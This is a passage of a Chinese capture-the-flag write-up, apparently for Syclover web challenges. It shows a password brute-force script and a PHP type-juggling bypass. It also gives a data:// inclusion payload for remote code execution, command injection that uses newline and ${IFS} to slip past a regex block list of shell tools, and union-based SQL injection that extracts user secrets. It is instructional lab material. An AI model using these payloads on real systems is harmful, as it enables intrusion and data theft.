class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://121.5.62.30:38001/EasyTime/&quot;</span>, <span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br><br><br>bef=<span class="hljs-string">&quot;774&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br><span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">10</span>:<br>s=<span class="hljs-string">&quot;00&quot;</span>+<span class="hljs-built_in">str</span>(i)<br><span class="hljs-keyword">if</span> i&lt;<span class="hljs-number">100</span>:<br>s=<span class="hljs-string">&quot;0&quot;</span>+<span class="hljs-built_in">str</span>(i)<br><span class="hljs-keyword">else</span>:<br>s=<span class="hljs-built_in">str</span>(i)<br>pwd=bef+s<br>pwdmd=md5(pwd.encode()).hexdigest()<br><span class="hljs-comment"># print(pwd)</span><br>burp0_data = &#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;Syclover&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>: pwdmd&#125;<br>result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;错误&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> result.text:<br><span class="hljs-built_in">print</span>(pwd)<br><span class="hljs-built_in">print</span>(result.text)<br><span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p>flag:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-number">774931</span><br>登录成功,flag是SYC&#123;xi_huan_4_l&#125;<br><span class="hljs-string"></span><br><span class="hljs-string">[Finished in 50.8s]</span><br></code></pre></td></tr></table></figure><h2 id="来发个包"><a href="#来发个包" class="headerlink" title="来发个包"></a>来发个包</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004016.png" alt="image-20221120101842997"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> uname = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;ifflag&#x27;</span>).<span class="hljs-property">value</span>;<br>    <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br><span class="hljs-keyword">var</span> param = <span class="hljs-string">&#x27;ifffflag=&#x27;</span>+uname;<br>xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-string">&#x27;flag.php&#x27;</span>,<span class="hljs-literal">true</span>);<br>xhr.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>,<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);<br>xhr.<span class="hljs-title function_">send</span>(param);<br>xhr.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">if</span>(xhr.<span class="hljs-property">readyState</span> == <span class="hljs-number">4</span>)&#123;<br>        <span class="hljs-keyword">if</span>(xhr.<span class="hljs-property">status</span> == <span class="hljs-number">200</span>)&#123;<br>            <span class="hljs-title function_">alert</span>(xhr.<span class="hljs-property">responseText</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>源码给出了js的XMLHttpReques对象发包源码，复制下来在控制台执行</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">var</span> uname = <span class="hljs-string">&quot;flag&quot;</span>;<br>    <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();<br><span class="hljs-keyword">var</span> param = <span class="hljs-string">&#x27;ifffflag=&#x27;</span>+uname;<br>xhr.open(<span class="hljs-string">&#x27;post&#x27;</span>,<span class="hljs-string">&#x27;flag.php&#x27;</span>,<span class="hljs-literal">true</span>);<br>xhr.setRequestHeader(<span class="hljs-string">&quot;Content-Type&quot;</span>,<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);<br>xhr.send(param);<br>xhr.onreadystatechange = <span class="hljs-keyword">function</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">if</span>(xhr.readyState == <span class="hljs-number">4</span>)&#123;<br>        <span class="hljs-keyword">if</span>(xhr.status == <span class="hljs-number">200</span>)&#123;<br>            alert(xhr.responseText);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004017.png" alt="image-20221120102013993"></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">SYC&#123;:</span>D_y0u_has_known_how_to_construct_<span class="hljs-built_in">a_requests</span>_by_yourself&#125;<br></code></pre></td></tr></table></figure><h2 id="Can-Can-Need"><a href="#Can-Can-Need" class="headerlink" title="Can Can Need"></a>Can Can Need</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004018.png" alt="image-20221120102623830"></p><p>基础的HTTP请求头伪造，就是From冷门点（反正我记不清有这个</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004019.png" alt="image-20221120105555689"></p><h2 id="L0veSyc"><a href="#L0veSyc" class="headerlink" title="L0veSyc"></a>L0veSyc</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004020.png" alt="image-20221120110025154"></p><p>访问三叶草安全主页，源码搜索SYC</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004021.png" alt="image-20221120110248984"></p><h2 id="justphp"><a href="#justphp" class="headerlink" title="justphp"></a>justphp</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004022.png" alt="image-20221120110424225"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include_once</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$sleeptime</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;SleepTime&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$sleeptime</span>))<br>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$sleeptime</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;时间是一个数字啊喂！&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><span class="hljs-title function_ invoke__"> if</span>(<span class="hljs-variable">$sleeptime </span>&lt; <span class="hljs-number">86400</span> * <span class="hljs-number">30</span>)<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;这点时间哪够Canzik学长睡啊&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><span class="hljs-title function_ invoke__"> if</span>(<span class="hljs-variable">$sleeptime </span>&gt; <span class="hljs-number">86400</span> * <span class="hljs-number">60</span>)<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;别让Canzik学长睡死在这啊！&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br/&gt;Canzik学长很满足,表示这次把这辈子的觉都睡完啦！flag在这,自己拿吧:&lt;br/&gt;&#x27;</span>;<br>        <span class="hljs-title function_ invoke__">sleep</span>((<span class="hljs-keyword">int</span>)<span class="hljs-variable">$sleeptime</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>弱类型绕过，需要先试出86400*30到86400*60之间的科学计数法表示的数字，这里sleep有一个int的类型转换，e在int的类型转换里不会被识别为科学计数法，可理解为只是作为一个普通的字母截断。</p><p>payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>.<span class="hljs-number">5</span>e7<br></code></pre></td></tr></table></figure><p>经过int转换为0.5</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004023.png" alt="image-20221120112119189"></p><h2 id="jsfind"><a href="#jsfind" class="headerlink" title="jsfind"></a>jsfind</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004024.png" alt="image-20221120112401318"></p><p>jsfinder工具（github有）找到</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/js/</span>aaa<span class="hljs-regexp">/aaa/</span>aaa<span class="hljs-regexp">/bbb/</span>bbb<span class="hljs-regexp">/bbb/</span>bbb<span class="hljs-regexp">/bbb/</span>bbb<span class="hljs-regexp">/aaa/</span>aaa<span class="hljs-regexp">/aaa/</span>aaa<span class="hljs-regexp">/aaa/</span>bbb/flag.js<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004025.png" alt="image-20221120120248315"></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">SYC=~[];SYC=&#123;___:++SYC,<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>:(![]+<span class="hljs-string">&quot;&quot;</span>)[SYC],__<span class="hljs-symbol">$</span>:++SYC,<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>_:(![]+<span class="hljs-string">&quot;&quot;</span>)[SYC],_<span class="hljs-symbol">$</span>_:++SYC,<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>:(&#123;&#125;+<span class="hljs-string">&quot;&quot;</span>)[SYC],<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>:(SYC[SYC]+<span class="hljs-string">&quot;&quot;</span>)[SYC],_<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>:++SYC,<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>_:(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[SYC],<span class="hljs-symbol">$</span>__:++SYC,<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>:++SYC,<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>__:(&#123;&#125;+<span class="hljs-string">&quot;&quot;</span>)[SYC],<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>_:++SYC,<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>:++SYC,<span class="hljs-symbol">$</span>___:++SYC,<span class="hljs-symbol">$</span>__<span class="hljs-symbol">$</span>:++SYC&#125;;SYC.<span class="hljs-symbol">$</span>_=(SYC.<span class="hljs-symbol">$</span>_=SYC+<span class="hljs-string">&quot;&quot;</span>)[SYC.<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>]+(SYC._<span class="hljs-symbol">$</span>=SYC.<span class="hljs-symbol">$</span>_[SYC.__<span class="hljs-symbol">$</span>])+(SYC.<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>=(SYC.<span class="hljs-symbol">$</span>+<span class="hljs-string">&quot;&quot;</span>)[SYC.__<span class="hljs-symbol">$</span>])+((!SYC)+<span class="hljs-string">&quot;&quot;</span>)[SYC._<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>]+(SYC.__=SYC.<span class="hljs-symbol">$</span>_[SYC.<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>_])+(SYC.<span class="hljs-symbol">$</span>=(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[SYC.__<span class="hljs-symbol">$</span>])+(SYC._=(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[SYC._<span class="hljs-symbol">$</span>_])+SYC.<span class="hljs-symbol">$</span>_[SYC.<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>]+SYC.__+SYC._<span class="hljs-symbol">$</span>+SYC.<span class="hljs-symbol">$</span>;SYC.<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>=SYC.<span class="hljs-symbol">$</span>+(!<span class="hljs-string">&quot;&quot;</span>+<span class="hljs-string">&quot;&quot;</span>)[SYC._<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>]+SYC.__+SYC._+SYC.<span class="hljs-symbol">$</span>+SYC.<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>;SYC.<span class="hljs-symbol">$</span>=(SYC.___)[SYC.<span class="hljs-symbol">$</span>_][SYC.<span class="hljs-symbol">$</span>_];SYC.<span class="hljs-symbol">$</span>(SYC.<span class="hljs-symbol">$</span>(SYC.<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>+<span class="hljs-string">&quot;\&quot;&quot;</span>+SYC.<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>_+(![]+<span class="hljs-string">&quot;&quot;</span>)[SYC._<span class="hljs-symbol">$</span>_]+SYC.<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>_+<span class="hljs-string">&quot;\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>_+SYC._<span class="hljs-symbol">$</span>_+SYC.__+<span class="hljs-string">&quot;(&#x27;\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC._<span class="hljs-symbol">$</span>_+SYC._<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>+<span class="hljs-string">&quot;\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC._<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>+SYC.__<span class="hljs-symbol">$</span>+<span class="hljs-string">&quot;\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.___+SYC._<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>+<span class="hljs-string">&quot;&#123;\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.___+SYC.<span class="hljs-symbol">$</span>__+<span class="hljs-string">&quot;@\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.___+SYC._+<span class="hljs-string">&quot;_\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.<span class="hljs-symbol">$</span>__+<span class="hljs-string">&quot;\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>+SYC.__<span class="hljs-symbol">$</span>+<span class="hljs-string">&quot;\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.__<span class="hljs-symbol">$</span>+SYC._<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>+<span class="hljs-string">&quot;\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.__<span class="hljs-symbol">$</span>+SYC._<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>+SYC.<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>_+<span class="hljs-string">&quot;_\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.___+SYC.<span class="hljs-symbol">$</span>__+SYC._<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>+SYC.<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>__+SYC._<span class="hljs-symbol">$</span>+SYC.<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>+SYC.<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>_+<span class="hljs-string">&quot;_\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.___+SYC.<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>+<span class="hljs-string">&quot;\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>+SYC.<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>_+<span class="hljs-string">&quot;\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.___+SYC._<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>+SYC._<span class="hljs-symbol">$</span>+SYC.<span class="hljs-symbol">$</span><span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>+<span class="hljs-string">&quot;\\&quot;</span>+SYC.__<span class="hljs-symbol">$</span>+SYC.___+SYC.<span class="hljs-symbol">$</span>_<span class="hljs-symbol">$</span>+<span class="hljs-string">&quot;&#125;&#x27;);&quot;</span>+<span class="hljs-string">&quot;\&quot;&quot;</span>)())();<br></code></pre></td></tr></table></figure><p>猜测是JS代码，控制台执行一下</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004026.png" alt="image-20221120120514076"></p><h2 id="ezR-F-I"><a href="#ezR-F-I" class="headerlink" title="ezR_F_I"></a>ezR_F_I</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004027.png" alt="image-20221120120916845"></p><p>点开后</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/include.php?file=http:/</span><span class="hljs-regexp">/baidu.com/</span>robots.txt<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004028.png" alt="image-20221120121021468"></p><p>在file变量后加了一个.html，可以用data协议rce</p><p>payload：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">include.php?file=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004029.png" alt="image-20221120121832764"></p><h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004030.png" alt="image-20221120121944189"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment">/*佛又曰：输羯吉摩伽无婆羯尼羯驮萨夜南楞婆唵遮参怛烁阿怛度怛唎谨栗南提萨楞度摩谨伽伽墀醯咩驮夜帝俱佛悉呼数写帝尼嚧蒙舍利沙室罚陀俱悉夜喝唵尼孕南写利驮卢罚谨蒙伊谨尼卢利伽豆地皤穆罚驮醯伽无菩钵输烁呼驮数数嚧摩阇钵咩菩卢栗阇室栗罚俱室写耶穆墀摩利楞数皤哆呼无罚埵羯钵怛唎埵吉夜尼帝佛帝墀南吉孕室写南孕怛参阇呼怛伽迦地呼嚧咩参谨南他佛尼利栗数喝呼怛耶啰摩那羯喝萨啰俱婆楞孕孕穆呼哆输伽室利参迦苏摩伊嚧埵罚豆佛写那帝楞室墀度罚娑佛陀豆萨吉埵尼醯尼咩穆伽呼尼伊嚧呼阇娑摩苏驮苏地孕唵苏沙利无伽伊写提曳谨帝栗参啰迦俱菩罚呼遮埵无伽舍萨提遮他南栗醯啰罚曳咩伊娑咩楞咩豆墀钵皤度那沙栗菩夜苏迦迦摩婆萨输舍南沙啰输阇怛佛钵吉那埵南皤度啰孕遮烁沙蒙输他帝婆谨舍沙菩阿地阇遮阿埵输醯怛参栗无羯怛婆参舍无他羯悉遮吉孕羯哆蒙呼阇苏舍曳萨耶悉尼羯提娑谨遮婆罚罚苏婆数钵烁豆利室栗提陀他沙输悉罚唵埵摩迦啰参羯喝伊咩哆菩萨谨唎伊陀孕尼驮尼楞哆提栗悉诃参数嚧啰输罚咩尼罚唵迦沙穆穆无夜哆萨醯孕阇参羯佛耶南夜孕陀驮地醯舍尼驮萨提豆罚伽数阿耶呼栗写遮啰醯利萨嚧豆婆娑唵皤舍伊栗地沙阇婆喝利钵阇皤豆驮迦萨伊摩那唵迦穆羯萨驮娑摩那钵墀卢无陀埵谨哆醯穆醯度提室蒙夜伽悉提醯伊摩尼陀嚧写栗悉舍萨谨嚧提钵啰钵写啰萨墀曳唎埵参耶墀啰那喝迦遮嚧咩苏啰提咩卢耶埵阇楞孕喝怛羯嚧哆俱悉哆阇迦埵呼参舍沙蒙度穆夜皤尼诃无陀那沙沙蒙谨皤尼提诃穆悉罚啰输豆利尼阿栗喝皤豆喝咩咩嚧室曳醯楞墀利那参伽嚧钵输曳墀陀诃婆曳唎孕伽尼楞室谨蒙数唎迦醯帝摩提那谨俱摩婆罚南地他穆唵卢菩尼婆嚧醯写唎遮啰南无俱菩他孕娑怛栗他提卢菩数喝他帝俱诃罚无佛怛醯悉夜唵墀度摩咩帝舍孕豆他醯阿醯南摩沙哆室唎伊烁利驮咩参曳数吉沙钵怛羯伽穆嚧俱提诃罚参那南写数羯驮萨提孕数驮罚栗蒙墀谨驮羯度孕娑摩娑尼豆遮怛提尼陀烁呼喝婆萨沙伊迦羯曳佛遮卢遮尼苏谨啰栗室提参喝吉怛卢墀墀蒙摩利咩萨诃娑罚阿穆地舍尼蒙孕喝皤萨他嚧卢迦输地阿利曳楞喝哆曳喝醯沙诃南舍罚罚数提皤咩南悉伊喝栗摩诃输苏咩啰提吉尼无啰伊咩羯栗菩嚧室那那吉室伽写输南娑输耶墀舍沙无地迦无度提陀穆苏驮利蒙帝菩豆伽豆陀数穆伽度墀室孕卢提啰迦墀那呼俱吉唎地哆夜豆怛喝迦摩皤俱孕阿吉曳烁那阿哆俱输尼穆唎帝他卢烁曳他谨地皤卢地佛苏喝悉唵羯参曳尼啰楞驮沙输耶钵他菩那无曳吉遮罚喝舍输参卢豆伊摩耶曳迦曳夜娑唎墀蒙卢俱喝帝摩度曳曳伊喝他无钵伽吉室唎地唎咩埵舍唵孕尼尼嚧羯呼遮耶室迦墀娑钵驮提伊醯呼室写唎舍参陀南俱摩耶度耶烁写萨萨无伊陀吉墀罚孕利埵那利摩伽钵楞地伽迦喝利他输皤曳卢迦沙怛地写卢伊埵孕诃呼蒙埵输婆写阿唎蒙婆婆萨俱沙栗悉那蒙伽卢诃夜罚输无菩他参写迦诃穆萨他菩皤醯咩孕墀耶室驮钵唵摩埵墀利阇利伽墀埵楞婆喝写埵尼迦吉咩婆陀沙婆喝咩阇室楞豆皤俱楞迦室悉阇婆钵呼阿唎沙迦驮悉烁楞那陀娑楞菩钵埵喝室卢陀俱舍楞钵蒙夜穆帝菩喝地诃提地夜无他阿嚧夜漫</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><span class="hljs-keyword">if</span><span class="hljs-title function_ invoke__"> </span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip </span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>   <br>   <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|tee|head|wegt|nl|vi|vim|file|sh|dir|cat|more|less|tar|mv|cp|wegt|php|sort|echo|bash|curl|uniq|rev|\&quot;|\&#x27;| |\/|&lt;|&gt;|\\|/i&quot;</span>, <span class="hljs-variable">$ip</span>,<span class="hljs-variable">$match</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;hacker!&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ping -c 3 <span class="hljs-subst">$ip</span>&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>上面那个与佛论道我没有解出来，没找到对应的网站</p><p>payload:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?i</span>p=%0atac<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;may_b3_y0u_can_pr0t3ct.p?p<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004031.png" alt="image-20221120123318226"></p><h2 id="WelcomeSQL"><a href="#WelcomeSQL" class="headerlink" title="WelcomeSQL"></a>WelcomeSQL</h2><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004032.png" alt="image-20221120123353883"></p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004033.png" alt="image-20221120123427114"></p><p>数字型联合注入</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>()<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004034.png" alt="image-20221120124208519"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">WelcomeSQL</span><br><span class="hljs-attribute">WelcomeSQL</span>,information_schema,mysql,performance_schema<br><span class="hljs-attribute">10</span>.<span class="hljs-number">2</span>.<span class="hljs-number">26</span>-MariaDB-log<br><br></code></pre></td></tr></table></figure><p>如果语句报错会</p><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004035.png" alt="image-20221120125340080"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">id=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;user_info&#x27;</span><br>id=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(id,<span class="hljs-string">&#x27;---&#x27;</span>,username,<span class="hljs-string">&#x27;---&#x27;</span>,secret) <span class="hljs-keyword">from</span> WelcomeSQL.user_info<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ArushArk/picblog/main/data/202301102004036.png" 